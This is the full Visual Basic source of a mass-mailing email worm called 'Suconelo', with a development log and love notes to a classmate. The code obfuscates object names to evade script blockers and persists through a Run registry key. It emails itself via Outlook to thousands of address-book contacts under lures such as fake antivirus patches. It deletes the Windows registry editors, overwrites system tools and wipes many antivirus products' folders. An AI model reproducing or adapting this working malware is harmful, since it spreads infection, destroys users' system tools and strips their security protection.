Sub Comentarios()
Rem Virus dedicado a Consuelo, Rocío y Melissa, el grupo de minas de mi curso :P
Rem Consuelo quisiera que supieras lo que siento por tí, soy un avergonzado :S

End Sub

Sub Histologia_o_Bitacora()
' Sabado 22 de febrero del 2003
' 1:00 AM - Empiezo la creación Suconelo

' Mismo día de creación.
' 1:55 AM - tengo problemas con el registro de Windows... ojalá solo sea Windows XP

' Mismo día de creación.
' 2:05 AM - Creo haber resuelto el problema
' 2:10 AM - problema resuelto, que weon soy xD

' Mismo día de creación
' 5:50 AM - Terminé la rutina del MAPI...

' Mismo día de creación
' 6:05 AM - Termina por la madrugada... A dormir.. :S

' Sabado 22
' 12:30 PM - Solucionados problemas con la ingenería

' Sabado 22
' 22:30 PM - Virus BETA terminado

' Sabado 22
' 23:10 PM - Virus testeado. MAPI no funciona

' Sabado 22
' 23:30 PM - Falckon arregla MAPI
' 23:30 PM - Se cambian variables
' 23:30 PM - AVP Script BLOCKER NO DETECTA!!!

' Domingo 23
' 0:03 AM - Virus listo, se agregó que borrara el McAfee 7.0 y se cambió el ícono

End Sub

Private Sub Form_Load()
On Error Resume Next
Rem W32.Suconelo, W32.Consuelo - By Nincubus/ViriiZone

Dim a, b, c, d, e, f, g, h, i, Scr1, Scr2
a = "Scri"
b = "pting"
c = ".fileS"
d = "ystemO"
e = "bject"
f = "Wscr"
g = "ipt."
h = "She"
i = "ll"
Set Scr1 = CreateObject(a + b + c + d + e)
Set Scr2 = CreateObject(f + g + h + i)

windir = Scr1.GetSpecialFolder(0)
sysdir = Scr1.GetSpecialFolder(1)
tmpdir = Scr1.GetSpecialFolder(2)
prgdir = Scr2.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")

MkDir sysdir + "\Suconelo"
SetAttr sysdir + "\Suconelo", vbHidden + vbSystem + vbDirectory

Open sysdir + "\Suconelo\consuelo.txt" For Output As #1
Print #1, "Consuelo I just wanna that you know the truth"
Print #1, "I just... just... love you."
Print #1, "It's all that i can say..."
Print #1, "Bye baby, Consuelo don't forget it... I love you..."
Close #1
Scr2.Run (sysdir + "\Suconelo\consuelo.txt")

enviado = Scr2.RegRead("HKEY_LOCAL_MACHINE\Software\Suconelo\Mailed")

If enviado = 1 Then
MsgBox "Hi, You're fucked by Nincubus/ViriiZone!!!" + vbCrLf + vbCrLf + " Don't be fooled or fucked, be care!!! ", vbOKOnly, "Suconelo"
Else
Rem Reproducción de virus xD
Dim j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z
j = "Out"
k = "look."
l = "Appl"
m = "icat"
n = "ion"
o = "M"
p = "AP"
q = "I"

Randomize
y = Int(Rnd * 19)
If y = 0 Then asunto = "Consuelo Pics"
If y = 1 Then asunto = "Virus Alert!!"
If y = 2 Then asunto = "Norton New Patches"
If y = 3 Then asunto = "McAfee VirusScan Patches"
If y = 4 Then asunto = "Kaspersky AVP Patches"
If y = 5 Then asunto = "Hacking hotmail"
If y = 6 Then asunto = "Hackers Tutorials"
If y = 7 Then asunto = "Hackear hotmail"
If y = 8 Then asunto = "Parches para Norton 2003"
If y = 9 Then asunto = "Parches para McAfee VirusScan 2003"
If y = 10 Then asunto = "Parches para kaspersky AVP"
If y = 11 Then asunto = "Fotos de Consuelo"
If y = 12 Then asunto = "Alertas de virus!!"
If y = 13 Then asunto = "Hacker Tutorials"
If y = 14 Then asunto = "Fwd: Horoscopo"
If y = 15 Then asunto = "Fwd: Love Test"
If y = 16 Then asunto = "Re: The File Please"
If y = 17 Then asunto = "Re: El archivo..."
If y = 18 Then asunto = "Safety"
If y = 19 Then asunto = "This Pics are only for you ;)"

If asunto = "Consuelo Pics" Then mensaje = "Check this consuelo pics, only for you, see the attachment"
If asunto = "Virus Alert!!" Then mensaje = "New Virus Alert!!! Be Care With VBS/DeathLetter, in the atachment i send you an antivirus, by accepting, you'll be protected :)"
If asunto = "Norton New Patches" Then mensaje = "Open this New patches of Norton for Windows 9x/Me/2000/NT/XP be care with VBS/DeathLetter, this is an ilegal patch, but don't worry. We distributed this with Symantec permission, so don't worry ;)"
If asunto = "McAfee VirusScan Patches" Then mensaje = "Open this New patches of McAfee for Windows 9x/Me/2000/NT/XP be care with VBS/DeathLetter, this is an ilegal patch, but don't worry. We distributed this with McAfee permission, so don't worry ;)"
If asunto = "Kaspersky AVP Patches" Then mensaje = "Open this New patches of Kaspersky AVP for Windows 9x/Me/2000/NT/XP be care with VBS/DeathLetter, this is an ilegal patch, but don't worry. We distributed this with kaspersky permission, so don't worry ;)"
If asunto = "Hacking hotmail" Then mensaje = "Hey!!! There are new hacking tutorials by hacking hotmail :D Have fun!"
If asunto = "Hackers Tutorials" Then mensaje = "Hi, this is a file that you can access to another machine without his or her permission. Have Fun!!!"
If asunto = "Hackear hotmail" Then mensaje = "Que onda... te envío estos tutoriales para que aprendas a hackear a los que te caen mal y están en hotmail. Diviertete!!!"
If asunto = "Parches para Norton 2003" Then mensaje = "Hola!!!, por ahí dicen que hay alertas para el virus DeathLetter, así que ejecuta estos parches para que no seas infectado :)"
If asunto = "Parches para McAfee VirusScan 2003" Then mensaje = "Hola!!!, por ahí dicen que hay alertas para el virus DeathLetter, así que ejecuta estos parches para que no seas infectado :)"
If asunto = "Parches para kaspersky AVP" Then mensaje = "Hola!!!, por ahí dicen que hay alertas para el virus DeathLetter, así que ejecuta estos parches para que no seas infectado :)"
If asunto = "Fotos de Consuelo" Then mensaje = "ve las fotos de Consuelo, son solo para tí!!! ;)"
If asunto = "Alertas de virus!!" Then mensaje = "Hola, te envío la lista de los nuevos virus, espero que no seas afectado!!! van adjuntos los mensajes de los virus y los nombres de archivos..."
If asunto = "Hacker Tutorials" Then mensaje = "Hi, I sent you Hacker tutorials by hacking the bad person who causes bad to you..."
If asunto = "Fwd: Horoscopo" Then mensaje = "The horoscopo Test is in this file, have Fun!"
If asunto = "Fwd: Love Test" Then mensaje = "Love test is in this file, Have Fun!"
If asunto = "Re: The File Please" Then mensaje = "This is the file you ask for..."
If asunto = "Re: El archivo..." Then mensaje = "Aquí está el archivo por el que pregunaste ;-)"
If asunto = "Safety" Then mensaje = "Safety for your PC, now, then can enter to our machines just by clicking in Haktek and putting our IP, so, i sent you a Firewall 'cause I wanna Protect you!"
If asunto = "This Pics are only for you ;)" Then mensaje = "Check This pics!!!"

If mensaje = "Check this consuelo pics, only for you, see the attachment" Then nombre = "consuelo_pics"
If mensaje = "New Virus Alert!!! Be Care With VBS/DeathLetter, in the atachment i send you an antivirus, by accepting, you'll be protected :)" Then nombre = "protector"
If mensaje = "Open this New patches of Norton for Windows 9x/Me/2000/NT/XP be care with VBS/DeathLetter, this is an ilegal patch, but don't worry. We distributed this with Symantec permission, so don't worry ;)" Then nombre = "patch"
If mensaje = "Open this New patches of McAfee for Windows 9x/Me/2000/NT/XP be care with VBS/DeathLetter, this is an ilegal patch, but don't worry. We distributed this with McAfee permission, so don't worry ;)" Then nombre = "patch"
If mensaje = "Open this New patches of Kaspersky AVP for Windows 9x/Me/2000/NT/XP be care with VBS/DeathLetter, this is an ilegal patch, but don't worry. We distributed this with kaspersky permission, so don't worry ;)" Then nombre = "patch"
If mensaje = "Hey!!! There are new hacking tutorials by hacking hotmail :D Have fun!" Then nombre = "hacking_hotmail.txt"
If mensaje = "Hi, this is a file that you can access to another machine without his or her permission. Have Fun!!!" Then nombre = "hacking"
If mensaje = "Que onda... te envío estos tutoriales para que aprendas a hackear a los que te caen mal y están en hotmail. Diviertete!!!" Then nombre = "hackeando"
If mensaje = "Hola!!!, por ahí dicen que hay alertas para el virus DeathLetter, así que ejecuta estos parches para que no seas infectado :)" Then nombre = "parches"
If mensaje = "Hola!!!, por ahí dicen que hay alertas para el virus DeathLetter, así que ejecuta estos parches para que no seas infectado :)" Then nombre = "parches"
If mensaje = "Hola!!!, por ahí dicen que hay alertas para el virus DeathLetter, así que ejecuta estos parches para que no seas infectado :)" Then nombre = "parches"
If mensaje = "ve las fotos de Consuelo, son solo para tí!!! ;)" Then nombre = "fotos_De_consuelo"
If mensaje = "Hola, te envío la lista de los nuevos virus, espero que no seas afectado!!! van adjuntos los mensajes de los virus y los nombres de archivos..." Then nombre = "list.txt"
If mensaje = "Hi, I sent you Hacker tutorials by hacking the bad person who causes bad to you..." Then nombre = "Hacking tutorials"
If mensaje = "The horoscopo Test is in this file, have Fun!" Then nombre = "horoscopo"
If mensaje = "Love test is in this file, Have Fun!" Then nombre = "lovetest"
If mensaje = "This is the file you ask for..." Then nombre = "iexplore_security_patch"
If mensaje = "Aquí está el archivo por el que pregunaste ;-)" Then nombre = "parche_Seguridad_iexplorer"
If mensaje = "Safety for your PC, now, then can enter to our machines just by clicking in Haktek and putting our IP, so, i sent you a Firewall 'cause I wanna Protect you!" Then nombre = "firewall"
If mensaje = "Check This pics!!!" Then nombre = "consuelo_pics_installer"
Dim path
path = App.path + "\" + App.EXEName + ".exe"
FileCopy path, sysdir + "\Suconelo" + nombre + ".exe"
FileCopy path, "C:\Recycled\Suconelo.exe"
SetAttr "C:\Recycled\Suconelo.exe", vbHidden + vbSystem

Dim ext As String
ext = ".exe"
Set r = CreateObject(j + k + l + m + n)
Set s = r.getnamespace(o + p + q)
Set w = r.CreateItem(0)
For t = 1 To s.AddressLists.Count
Set u = s.AddressLists.Item(t)
v = 1
Set z = u.AddressEntries
For x = 1 To z.Count
v = v + 1
If v > 5000 Then Exit For
w.Recipients.Add z.Item(x)
Next
w.Subject = asunto
w.Body = mensaje
w.Attachments.Add sysdir + "\Suconelo" + nombre + ".exe"
w.DeleteAfterSubmit = True
w.Send
Next
Scr2.RegWrite "HKEY_LOCAL_MACHINE\Software\Suconelo\mailed", "1"
End If

a1 = Scr2.RegRead("HKEY_LOCAL_MACHINE\Software\Suconelo\windeleted")
If a1 = 1 Then
MsgBox "I've erased windows Regedit or windows Regedt32. :(", vbInformation + vbOKOnly, "Watta bad luck!!!"
Else
Kill windir + "\regedit.exe"
Kill windir + "\regedt32.exe"
Kill sysdir + "\regedit.exe"
Kill sysdir + "\regedt32.exe"
Scr2.RegWrite "HKEY_LOCAL_MACHINE\Software\Suconelo\windeleted", "1"
End If

a2 = Scr2.RegRead("HKEY_LOCAL_MACHINE\Software\Suconelo\infected")
If a2 = 1 Then
MsgBox "Do not open stranger things by email!!!" + vbCrLf + vbCrLf + "Now you've lost your machine :(", vbCritical + vbOKOnly, "Your computer is gone"
Else
Scr2.RegWrite "HKEY_LOCAL_MACHINE\Software\Suconelo\infected", "1"
End If

Rem no me olvido del ke se ejecute a cada inicio xD
a3 = Scr2.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Windows")
If a3 = "C:\recycled\Suconelo.exe" Then
MsgBox "be care with the thing they send you in a strange mail!!!", vbInformation + vbOKOnly, "Suconelo"
Else
Scr2.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Currentversion\Run\Windows", "C:\recycled\Suconelo.exe"
End If

a5 = Scr2.RegRead("HKEY_LOCAL_MACHINE\Software\Suconelo\named")
If a5 = 1 Then
SetAttr sysdir + "\cmd.exe", vbArchive
Name sysdir + "\cmd.exe" As sysdir + "cmd.exe.vbs"
Name windir + "\cmd.exe" As windir + "cmd.exe.vbs"
Do
Kill sysdir + "\cmd.exe"
Kill windir + "\cmd.exe"
Loop
Open sysdir + "\cmd.exe.vbs" For Output As #2
Print #2, "on error resume next"
Print #2, "' I love you Consuelo"
Print #2, "MsgBox " + Chr(34) + "I've destroyed your pc" + Chr(34) + ", 37, " + Chr(34) + "Consuelo I love you"
Close #2

Open windir + "\cmd.exe.vbs" For Output As #3
Print #4, "on error resume next"
Print #4, "' I love you Consuelo"
Print #4, "MsgBox " + Chr(34) + "I've destroyed your pc" + Chr(34) + ", 37, " + Chr(34) + "Consuelo I love you"
Close #4
Else

SetAttr windir + "\sysedit.exe", vbArchive
Name windir + "\sysedit.exe" As windir + "\sysedit.exe.vbs"
Kill windir + "\sysedit.exe"
Open windir + "\sysedit.exe.vbs" For Output As #4
Print #4, "on error resume next"
Print #4, "' I love you Consuelo"
Print #4, "MsgBox " + Chr(34) + "I've destroyed your pc" + Chr(34) + ", 37, " + Chr(34) + "Consuelo I love you"
Close #4

SetAttr windir + "\msconfig.exe", vbArchive
Name windir + "\msconfig.exe" As windir + "\msconfig.exe.vbs"
Kill windir + "\msconfig.exe"
Open windir + "\msconfig.exe.vbs" For Output As #5
Print #5, "on error resume next"
Print #5, "' I love you Consuelo"
Print #5, "MsgBox " + Chr(34) + "I've destroyed your pc" + Chr(34) + ", 37, " + Chr(34) + "Consuelo I love you"
Close #5

Scr2.RegWrite "HKEY_LOCAL_MACHINE\Software\Suconelo\named", "1"
End If


Rem Borración de antivirus (BORRACIÓN PALABRA INVENTADA POR YO xD)
If Scr1.FolderExists(prgdir & "\AntiViral Toolkit Pro") Then Kill (prgdir & "\AntiViral Toolkit Pro\*.*")
If Scr1.FolderExists(prgdir & "\Command Software\F-PROT95") Then Kill (prgdir & "\Command Software\F-PROT95\*.*")
If Scr1.FolderExists(prgdir & "\McAfee\VirusScan") Then Kill (prgdir & "\McAfee\VirusScan\*.*")
If Scr1.FolderExists(prgdir & "\Norton AntiVirus") Then Kill (prgdir & "\Norton AntiVirus\*.*")
If Scr1.FolderExists("C:\Toolkit\FindVirus") Then Kill ("C:\Toolkitt\FindVirus\*.*")
If Scr1.FolderExists(prgdir & "\Panda Software\Panda Antivirus Titanium") Then Kill (prgdir & "\Panda Software\Panda Antivirus Titanium\*.*")
If Scr1.FolderExists(prgdir & "\Trend Micro\PC-cillin 2002") Then Kill (prgdir & "\Trend Micro\PC-cillin 2002\*.*")
If Scr1.FolderExists(prgdir & "\AVPersonal") Then Kill (prgdir & "\AVPersonal\*.*")
If Scr1.FolderExists(prgdir & "\Trend PC-cillin 98") Then Kill (prgdir & "\Trend PC-cillin 98\*.*")
If Scr1.FolderExists(prgdir & "\Perav") Then Kill (prgdir & "\Perav\*.*")
If Scr1.FolderExists(prgdir & "\McAfee\McAfee VirusScan") Then Kill (prgdir & "\McAfee\McAfee VirusScan\*.*")
If Scr1.FolderExists(prgdir & "\Panda Software\Panda Antivirus 6.0") Then Kill (prgdir & "\Panda Software\Panda Antivirus 6.0\*.*")
If Scr1.FolderExists(prgdir & "\Trend Micro\PC-cillin 2000") Then Kill (prgdir & "\Trend Micro\PC-cillin 2000\*.*")
If Scr1.FolderExists(prgdir & "\AnalogX\Script Defender") Then Kill (prgdir & "\AnalogX\Script Defender\*.*")
If Scr1.FolderExists(prgdir & "\F-Secure\Anti-Virus") Then Kill (prgdir & "\F-Secure\Anti-Virus\*.*")
If Scr1.FolderExists(prgdir & "\Zone Labs\ZoneAlarm") Then Kill (prgdir & "\Zone Labs\ZoneAlarm\*.*")
If Scr1.FolderExists(prgdir & "\ESET\NOD32") Then Kill (prgdir & "\ESET\NOD32\*.*")
If Scr1.FolderExists(prgdir & "\McAfee VirusScan Professional Edition 7.0") Then Kill (prgdir & "\McAfee VirusScan Professional Edition 7.0\*.*")

End Sub